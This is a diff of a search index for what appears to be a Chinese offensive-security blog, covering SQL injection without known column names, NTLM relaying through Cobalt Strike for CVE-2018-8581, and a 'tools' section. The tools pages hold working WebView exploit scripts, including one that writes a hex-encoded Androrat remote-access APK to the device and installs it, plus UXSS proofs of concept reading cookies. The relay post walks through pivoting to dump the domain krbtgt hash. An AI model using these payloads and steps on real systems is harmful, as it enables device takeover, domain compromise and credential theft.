@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[不知道列名的情况下注入]]></title>
+    <url>%2Farchives%2Fsqli_without_knowing_columns_names.html</url>
+    <content type="text"><![CDATA[0x00 简介在 mysql =&gt; 5 的版本中存在库information_schema,记录着mysql中所有表的结构，通常，在mysql sqli中，我们会通过此库中的表去获取其他表的结构，即表名，列名等。但是这个库也会经常被WAF过滤。当我们通过暴力破解获取到表名后，该如何进行下一步利用呢？ 在information_schema中，除了SCHEMATA，TABLES，COLUMNS有表信息外，高版本的mysql中，还有INNODB_TABLES及INNODB_COLUMNS中记录着表结构。 0x01 不使用表名查询正常的查询如下： 其中，列名为id,name,pass,mail,phone，使用union查询1select 1,2,3,4,5 union select * from users; 接着，就可以继续使用数字来对应列,如3对应了表里面的pass:1select `3` from (select 1,2,3,4,5 union select * from users)a; 当 ` 不能使用的时候，使用别名来代替：1select b from (select 1,2,3 as b,4,5 union select * from users)a; 在注入中查询多个列：1select concat(`2`,0x3a,`3`) from (select 1,2,3,4,5 union select * from users)a limit 1,1; FROM:Extracting data without knowing columns names]]></content>
+      <categories>
+        <category>奇技淫巧</category>
+      </categories>
+      <tags>
+        <tag>Sqli</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Remote NTLM relaying through CS]]></title>
     <url>%2Farchives%2FRemote_NTLM_relaying_through_CS.html</url>
     <content type="text"><![CDATA[0x00 为什么写这个？最近在学习Exchange在提权中的应用的时候，碰到一个问题，即：如果我们现在拥有了一个内网的windows主机，如何利用这台主机使用CVE_2018_8581 ？大概的结构是这样： 攻击者通过某种方式获取一台域内主机权限。并获取了此主机的域成员账号密码，在获取DC及Exchange Server的ip地址后，利用CVE_2018_8581 0x01 利用思路思路一：编译py版的impacket在做这个的时候，第一想法就是有没有windows下可用的impacket，后来找了找，还真有impacket_static_binaries，于是就拿来用了。但是后来发现是有问题的。首先，利用需要关闭win的445端口，这个就需要重启，这是我们非常不愿意做的，另外，似乎win版的ntlmrelayx 和 smbrelayx还不能用。 所以直接放弃了。 思路二：通过meterpreter进行NTLM relaying这个思路是之前看到的《Remote NTLM relaying through meterpreter on Windows port 445》来的。在这篇文章里面，详细分析了是谁占用了445，如何进行转发再进行Remote NTLM relaying。利用CVE_2018_8581，我们需要两个端口，445和80(80可以是其他端口，用来开启HTTP服务)，但是实际测试的时候，并不顺利，成功添加路由，开启端口转发，开启 socks4a 之后，本地通过proxychains开启一个web server，在内网其他主机请求这个server的时候，并未看到任何请求（可能是姿势不对，成功的师傅还望不吝赐教）。所以通过此方式，也并没达到我期望的效果。 思路三：通过CS部署VPN这个也是我觉得最简单的一种方式，在上面两种思路失败之后，就只能期待试用这种方式来进行了，还好，成功啦~ Cobaltstrike 的covertvpn的介绍，可以看这里。 在获取到一个Becon之后,右键连接-&gt;Pivoting-&gt;Deploy VPN 之后，选择对应的内网ip 点击ADD来添加本地网口： 在这里有多种方式的隧道，可以根据自己的需要选择，默认UDP是开销最小的一种方式。添加以后，点击Deploy则可部署成功。 之后，在Interfaces中可以看到对应信息： 之后我们在VPS上配置此网口：1sudo ifconfig Interface CIDR example:1sudo ifconfig phear5 10.211.55.225/24 前面的ip地址就是要给我们的网口配置的ip地址，相当于在域里面新接入了一台主机 之后，就可以与内网主机进行通信了。 这种方式我录了一个Demo： Tips：部署VPN只需要普通用户权限即可。但是获取当前用户账号密码需要提权。 0x02 如何防御 CVE_2018_8581删除域内某用户的DCSync权限，可使用 PowerView。 具体命令为：1Remove-DomainObjectAcl -TargetIdentity "DC=cgdomain,DC=com" -PrincipalIdentity user -Rights DCSync 根据自己的实际环境进行修改 修复Exchage权限，可使用 Fix-DomainObjectDACL.ps1 具体命令为： 1. .\Fix-DomainObjectDACL.ps1 -Fix 0x03 进一步测试经过进一步测试以及对漏洞的原理再次学习，发现其实我们只需要开启一个web服务即可，所以，可以使用任意端口(在impacket中，HTTPRelayServer默认端口为80，Exchange2domain已支持自定义端口)。 当然，上述 思路三 对smbrelay也是非常好用的一种方式。现在补充一下 思路二 的具体利用方法。 由于我们不需要smb Server，所以也不需要向《Remote NTLM relaying through meterpreter on Windows port 445》中所述对445端口进行转发，我们只需要将web端口转发出来即可。在获取一个meterpreter会话之后，添加路由:1meterpreter &gt; run post/multi/manage/autoroute 之后开启socks4a代理。 经过测试，发现msf的portfwd不怎么稳定，所以我选择了使用ew，当然，也可以使用lcx等其他转发工具。在vps上开启转发：1☁ lcx ./ew -s lcx_tran -l 8088 -f 127.0.0.1 -g 8044 监听本地8088端口，并将数据转发到127.0.0.1的8044端口 然后在我们有权限的主机上执行：1C:\Users\sanfeng\Desktop&gt;ew_for_Win.exe -s lcx_tran -l 8044 -f 103.*.*.* -g 8088 监听本地8044端口的数据，并将数据转发到103...*的8080端口。需要注意的是，有权限的主机监听端口=vps转发端口=Exchange2domain监听端口 之后，在vps上配置proxychains，ubuntu上proxychains的配置文件路径为/etc/proxychains.conf。修改代理配置文件，如下：12345[ProxyList]# add proxy here ...# meanwile# defaults set to "tor"socks4 127.0.0.1 1080 之后，我们就可一执行Exchange2domain了：1proxychains python Exchange2domain.py -ah proxyip -ap 8044 -u user -p password -d domain -th DCIP ExchangeIP --just-dc-user krbtgt 注意监听端口跟上面一致，proxyip为我们有权限的主机的ip地址。 所以，整个攻击过程如下： 希望以上对你有帮助。 0x04 参考 Remote NTLM relaying through meterpreter on Windows port 445 impacket_static_binaries VPN Pivoting with Cobalt Strike]]></content>
@@ -472,8 +483,8 @@
         <category>奇技淫巧</category>
       </categories>
       <tags>
-        <tag>bypass</tag>
         <tag>applocker</tag>
+        <tag>bypass</tag>
       </tags>
   </entry>
   <entry>
@@ -1024,6 +1035,11 @@
     <content type="text"></content>
   </entry>
   <entry>
+    <title><![CDATA[Tags]]></title>
+    <url>%2Ftags%2Findex.html</url>
+    <content type="text"></content>
+  </entry>
+  <entry>
     <title><![CDATA[友情链接]]></title>
     <url>%2Ffriends%2Findex.html</url>
     <content type="text"><![CDATA[快来交换友链吧~~ 交换友链须知 优先于技术、生活分享类博客站点友链，坚决不和论坛、导航、含有暴力等不健康信息内容站点做任何交换。 申请链接前请先添加本博链接。 申请请提供：站点名称、站点链接（请提供 https 协议链接）。 一些大佬和他们的博客。 三好学生博客 zEqueue’s Blog erevus’s blog Evi1oX’s blog 维尼熊宝贝Beta的熊窝 bsmali4的小窝 wdog’s blog Storm’s Blog freearoot’s Blog bPJoanna]]></content>
@@ -1034,19 +1050,14 @@
     <content type="text"></content>
   </entry>
   <entry>
-    <title><![CDATA[Tags]]></title>
-    <url>%2Ftags%2Findex.html</url>
-    <content type="text"></content>
+    <title></title>
+    <url>%2Ftools%2Fwebview.html</url>
+    <content type="text"><![CDATA[WebView 漏洞检测 如果当前 app 存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改： function check() { for (var obj in window) { try { if ("getClass" in window[obj]) { try{ window[obj].getClass(); document.write(''+obj+''); document.write(''); }catch(e){ } } } catch(e) { } } } check(); 检测出漏洞使用以下脚本验证(自行修改)： 1 .写文件 2 .反弹shell 3 .发短信 3 .挂马 参考 L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
     <title><![CDATA[Tools]]></title>
     <url>%2Ftools%2Findex.html</url>
     <content type="text"><![CDATA[1 .PHP序列化注入 Link 2 .Webshells Link 3 .Powershell取证工具 Link 4 .各种小工具 Link 5 .DLL_Hijacker Link 6 .WebView检测 Link 7 .Uxss检测 Link POC1 POC2 8.FlashCSRF Link 9.在线工具 Link 10.图形化PowerShell的在线编辑器 Link 11.Duck ToolKit Link 12.在线C段查询 Link 13.reg2powershell Link 14.XSSOR Link github 15.正则分析 Link 16.Powershell压缩文件 Link….]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>%2Ftools%2Fwebview.html</url>
-    <content type="text"><![CDATA[WebView 漏洞检测 如果当前 app 存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改： function check() { for (var obj in window) { try { if ("getClass" in window[obj]) { try{ window[obj].getClass(); document.write(''+obj+''); document.write(''); }catch(e){ } } } catch(e) { } } } check(); 检测出漏洞使用以下脚本验证(自行修改)： 1 .写文件 2 .反弹shell 3 .发短信 3 .挂马 参考 L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
     <title></title>
@@ -1060,13 +1071,13 @@
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fuxss%2Fpoc2.html</url>
-    <content type="text"><![CDATA[i = document.body.appendChild(document.createElement("iframe")); i.src = "http://m.baidu.com"; i.onload = function() { document.documentURI = "javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)"; i.contentWindow.location = ""; } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
+    <url>%2Ftools%2Fuxss%2Fpoc1.html</url>
+    <content type="text"><![CDATA[frame = document.body.appendChild(document.createElement("iframe")); frame.src = "http://m.baidu.com/"; frame.onload = function() { Function("}, (builtins = this), function() {"); originalInstantiate = builtins.Instantiate; builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {}); flag = 0; template = null; builtins.Instantiate = function(x, y) { if (flag) { doc = frame.contentWindow.document; alert(doc.cookie); flag = 0; } else if (!template) template = x; return originalInstantiate(x, y); }; document.implementation; flag = 1; builtins.ConfigureTemplateInstance(frame.contentWindow, template); } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fuxss%2Fpoc1.html</url>
-    <content type="text"><![CDATA[frame = document.body.appendChild(document.createElement("iframe")); frame.src = "http://m.baidu.com/"; frame.onload = function() { Function("}, (builtins = this), function() {"); originalInstantiate = builtins.Instantiate; builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {}); flag = 0; template = null; builtins.Instantiate = function(x, y) { if (flag) { doc = frame.contentWindow.document; alert(doc.cookie); flag = 0; } else if (!template) template = x; return originalInstantiate(x, y); }; document.implementation; flag = 1; builtins.ConfigureTemplateInstance(frame.contentWindow, template); } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
+    <url>%2Ftools%2Fuxss%2Fpoc2.html</url>
+    <content type="text"><![CDATA[i = document.body.appendChild(document.createElement("iframe")); i.src = "http://m.baidu.com"; i.onload = function() { document.documentURI = "javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)"; i.contentWindow.location = ""; } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
     <title></title>
@@ -1075,13 +1086,13 @@
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fwebviewpoc%2Fguama.js</url>
-    <content type="text"><![CDATA[function execute(cmdArgs) { return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } var armBinary1 = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4 var armBinary2="x1BxB0x65x0AxADx23xC2x30x64xDFxEExA1x0DxA4xE8x3Fx61x80xEExBCxE1xE7x7Bx4Ax25x6Fx8Bx36x71xC3x80x81x58xDBxC9x8Fx53x9FxEEx8Ax45xAFx23x54x4AxCFx2Bx52xF2x33x84xBAx82x36xC4x0Dx08xAFxC2x61x8ExD8x7Bx0BxFCx88x4Ax25x24x8Cx22xFAx76x44x78x5Ex99x62x30x44x8DxDBx74x94 var armBinary3=… var armBinary4=… …… var patharm = "/mnt/sdcard/Androrat.apk"; var a=execute(["/system/bin/sh","-c","echo -n +armBinary1+ > " + patharm]); //alert(a); execute(["/system/bin/sh","-c","echo -n +armBinary2+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary3+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary4+ >> " + patharm]); execute(["/system/bin/sh","-c","adb install /mnt/sdcard/Androrat.apk"]); alert("over !!!");]]></content>
+    <url>%2Ftools%2Fwebviewpoc%2Fwrite.js</url>
+    <content type="text"><![CDATA[function execute(cmdArgs) { return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } try{ execute(["/system/bin/sh","-c","echo 'Hello world' > /sdcard/goot.txt"]); }catch(e){ alert(e); }]]></content>
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fwebviewpoc%2Fwrite.js</url>
-    <content type="text"><![CDATA[function execute(cmdArgs) { return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } try{ execute(["/system/bin/sh","-c","echo 'Hello world' > /sdcard/goot.txt"]); }catch(e){ alert(e); }]]></content>
+    <url>%2Ftools%2Fwebviewpoc%2Fguama.js</url>
+    <content type="text"><![CDATA[function execute(cmdArgs) { return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } var armBinary1 = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4 var armBinary2="x1BxB0x65x0AxADx23xC2x30x64xDFxEExA1x0DxA4xE8x3Fx61x80xEExBCxE1xE7x7Bx4Ax25x6Fx8Bx36x71xC3x80x81x58xDBxC9x8Fx53x9FxEEx8Ax45xAFx23x54x4AxCFx2Bx52xF2x33x84xBAx82x36xC4x0Dx08xAFxC2x61x8ExD8x7Bx0BxFCx88x4Ax25x24x8Cx22xFAx76x44x78x5Ex99x62x30x44x8DxDBx74x94 var armBinary3=… var armBinary4=… …… var patharm = "/mnt/sdcard/Androrat.apk"; var a=execute(["/system/bin/sh","-c","echo -n +armBinary1+ > " + patharm]); //alert(a); execute(["/system/bin/sh","-c","echo -n +armBinary2+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary3+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary4+ >> " + patharm]); execute(["/system/bin/sh","-c","adb install /mnt/sdcard/Androrat.apk"]); alert("over !!!");]]></content>
   </entry>
   <entry>
     <title></title>
